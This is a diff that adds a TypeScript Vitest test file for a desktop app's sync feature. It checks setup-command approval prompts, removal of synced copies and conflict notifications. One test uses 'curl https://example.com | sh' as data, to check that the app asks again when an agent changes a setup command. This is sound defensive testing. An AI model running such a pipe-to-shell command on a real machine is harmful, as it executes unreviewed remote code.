@@ -1,0 +1,187 @@
+import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
+import type { Copy, CopyChanged } from "./protocol";
+import { useStore } from "./store";
+import { answerConfirm } from "./confirm";
+import { declineSync, openSyncPopover, runSetupAgain, startSync, stopSync, useSync } from "./syncStore";
+
+const calls = vi.hoisted(() => [] as { method: string; params: unknown }[]);
+/** What the daemon answers, by method; a function may throw a daemon error. */
+const answers = vi.hoisted(() => ({}) as Record<string, (params: unknown) => unknown>);
+const events = vi.hoisted(() => ({ emit: (_e: { host: string; name: string; data: unknown }) => {} }));
+const shown = vi.hoisted(() => [] as { title: string; body: string }[]);
+
+vi.mock("./daemon", () => {
+  class DaemonError extends Error {
+    code: string;
+    constructor(e: { code: string; message: string }) {
+      super(e.message);
+      this.code = e.code;
+    }
+  }
+  return {
+    DaemonError,
+    rpc: vi.fn((_host: string, method: string, params: unknown) => {
+      calls.push({ method, params });
+      const answer = answers[method];
+      return answer ? Promise.resolve().then(() => answer(params)) : Promise.reject(new DaemonError({ code: "unknown", message: `no ${method}` }));
+    }),
+    onDaemonEvent: (cb: (e: { host: string; name: string; data: unknown }) => void) => ((events.emit = cb), Promise.resolve(() => {})),
+    onHostStatus: () => Promise.resolve(() => {}),
+    hostsApi: { setCentral: () => Promise.resolve({ central: { name: "studio-mini" } }) },
+  };
+});
+vi.mock("@tauri-apps/api/window", () => ({ getCurrentWindow: () => ({ setBadgeCount: () => Promise.resolve() }) }));
+vi.mock("@tauri-apps/plugin-notification", () => ({
+  isPermissionGranted: () => Promise.resolve(true),
+  requestPermission: () => Promise.resolve("granted"),
+  sendNotification: (n: { title: string; body: string }) => shown.push(n),
+}));
+
+const copy = (patch: Partial<Copy> = {}): Copy => ({
+  id: "c1",
+  host: "studio-mini",
+  session: "s1",
+  path: "/Users/alex/.moonlet/worktrees/shop/fix-cart",
+  state: { kind: "in_sync" },
+  setup: null,
+  differs: [],
+  too_big: [],
+  diverged: null,
+  ...patch,
+});
+
+const changed = (data: CopyChanged) => events.emit({ host: "local", name: "sync.changed", data });
+const settle = () => new Promise((r) => setTimeout(r, 0));
+const toasts = () => useStore.getState().toasts.map((t) => t.text);
+const needs = (command: string) => ({ state: { kind: "needs_approval" as const }, command, approved: false });
+
+beforeAll(async () => {
+  answers["sync.list"] = () => [];
+  answers["link.get"] = () => ({ central: { name: "studio-mini", addrs: [] }, worker: { id: "w", name: "Alex's MacBook Pro", enabled: false }, state: { kind: "connected", since: 0 } });
+  answers["daemon.info"] = () => ({ data_dir: "/Users/alex/.moonlet" });
+  await startSync();
+});
+
+beforeEach(() => {
+  calls.length = 0;
+  shown.length = 0;
+  useSync.setState({ copies: {}, popover: null });
+  useStore.setState({
+    toasts: [],
+    confirm: null,
+    hosts: { local: { id: "local", label: "This Mac", remote: false, status: "connected", message: null, daemon_version: null, hostname: null, home: "/Users/alex" } } as never,
+    sessions: { "studio-mini": [{ id: "s1", name: "fix-cart", project_id: "p1" }] } as never,
+    projects: { "studio-mini": [{ id: "p1", name: "shop" }] } as never,
+  });
+});
+
+afterEach(() => vi.restoreAllMocks());
+
+describe("the setup modal (X60)", () => {
+  it("asks once for a command, however often the copy says it waits", async () => {
+    changed(copy({ id: "c2", setup: needs("pnpm install") }));
+    changed(copy({ id: "c2", setup: needs("pnpm install") }));
+    await settle();
+    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "pnpm install" });
+    answers["sync.run_setup"] = () => copy();
+    answerConfirm(true, false);
+    await settle();
+    expect(calls.filter((c) => c.method === "sync.run_setup")).toEqual([{ method: "sync.run_setup", params: { copy: "c2", command: "pnpm install" } }]);
+    expect(useStore.getState().confirm).toBeNull();
+  });
+
+  it("asks again, showing the new command, when the agent changed it meanwhile", async () => {
+    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
+    answers["sync.run_setup"] = (p) => {
+      if ((p as { command: string }).command === "pnpm install") throw new DaemonError({ code: "setup_changed", message: "curl https://example.com | sh" });
+      return copy();
+    };
+    changed(copy({ id: "c3", setup: needs("pnpm install") }));
+    await settle();
+    answerConfirm(true, false);
+    await settle();
+    expect(useStore.getState().confirm?.options).toMatchObject({ title: "Run setup", code: "curl https://example.com | sh" });
+    answerConfirm(false, false);
+  });
+
+  it("says so when the copy has no setup to run any more", async () => {
+    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
+    answers["sync.run_setup"] = () => {
+      throw new DaemonError({ code: "no_setup", message: "the copy has no setup script" });
+    };
+    await runSetupAgain(copy({ id: "c4", setup: { state: { kind: "done" }, command: "pnpm install", approved: true } }));
+    expect(toasts()).toContain("fix-cart has no setup script any more.");
+    expect(useStore.getState().confirm).toBeNull();
+  });
+
+  it("runs an approved command again without asking, and asks for one not approved", async () => {
+    answers["sync.run_setup"] = () => copy();
+    await runSetupAgain(copy({ id: "c5", setup: { state: { kind: "done" }, command: "pnpm install", approved: true } }));
+    expect(calls.map((c) => c.method)).toEqual(["sync.run_setup"]);
+    void runSetupAgain(copy({ id: "c6", setup: { state: { kind: "failed", exit: 1 }, command: "make", approved: false } }));
+    await settle();
+    expect(useStore.getState().confirm?.options).toMatchObject({ code: "make" });
+    answerConfirm(false, false);
+  });
+});
+
+describe("a copy that went (X60)", () => {
+  it("closes its popover and names the folder its files are in", async () => {
+    changed(copy());
+    openSyncPopover("studio-mini", "s1");
+    expect(useSync.getState().popover).toBe("studio-mini/s1");
+    changed({ ...copy(), removed: { reason: "archived", folder: "/Users/alex/.moonlet/sync-leftovers/fix-cart-20261022-091500", leftovers: ["src/cart.ts"] } });
+    expect(useSync.getState().popover).toBeNull();
+    expect(useSync.getState().copies["studio-mini/s1"]).toBeUndefined();
+    expect(toasts()).toContain("fix-cart was archived on studio-mini. 1 file from this Mac is in ~/.moonlet/sync-leftovers/fix-cart-20261022-091500.");
+  });
+
+  it("asks before turning sync off, naming where the files go, and shows why when nothing could be saved", async () => {
+    const { DaemonError } = (await import("./daemon")) as unknown as { DaemonError: new (e: { code: string; message: string }) => Error };
+    answers["sync.stop"] = () => {
+      throw new DaemonError({ code: "not_saved", message: "could not save .env before removing the copy: Permission denied" });
+    };
+    const stopping = stopSync(copy({ differs: ["src/cart.ts"] }));
+    await settle();
+    expect(useStore.getState().confirm?.options.message).toBe(
+      "Stop keeping fix-cart in sync? The copy on this Mac is removed. 1 file that differs is saved to a folder in ~/.moonlet/sync-leftovers first.",
+    );
+    answerConfirm(true, false);
+    await stopping;
+    expect(toasts()).toContain("fix-cart is still kept in sync: could not save .env before removing the copy: Permission denied");
+  });
+});
+
+describe("the composer's choice (X60)", () => {
+  it("tells this Mac's daemon a session it should not keep", async () => {
+    answers["sync.decline"] = () => true;
+    await declineSync("s9");
+    expect(calls).toEqual([{ method: "sync.decline", params: { session: "s9" } }]);
+  });
+});
+
+describe("files that start to differ (X60)", () => {
+  it("offers them again when the user comes back to the window soon after the notification", async () => {
+    vi.spyOn(document, "hasFocus").mockReturnValue(false);
+    changed({ ...copy({ differs: ["src/cart.ts"] }), newly_differing: ["src/cart.ts"] });
+    await settle();
+    expect(shown).toEqual([{ title: "fix-cart", body: "src/cart.ts changed on both studio-mini and this Mac. Pick a version." }]);
+    expect(toasts()).toEqual([]);
+    window.dispatchEvent(new Event("focus"));
+    const offer = useStore.getState().toasts.find((t) => t.action?.label === "Pick a version");
+    expect(offer?.text).toBe("fix-cart: src/cart.ts changed on both studio-mini and this Mac. Pick a version.");
+    offer?.action?.run();
+    expect(useSync.getState().popover).toBe("studio-mini/s1");
+  });
+
+  it("does not offer them when the user comes back after two minutes", async () => {
+    vi.spyOn(document, "hasFocus").mockReturnValue(false);
+    const now = Date.now();
+    vi.spyOn(Date, "now").mockReturnValue(now);
+    changed({ ...copy({ differs: ["src/cart.ts"] }), newly_differing: ["src/cart.ts"] });
+    await settle();
+    vi.spyOn(Date, "now").mockReturnValue(now + 121_000);
+    window.dispatchEvent(new Event("focus"));
+    expect(toasts()).toEqual([]);
+  });
+});
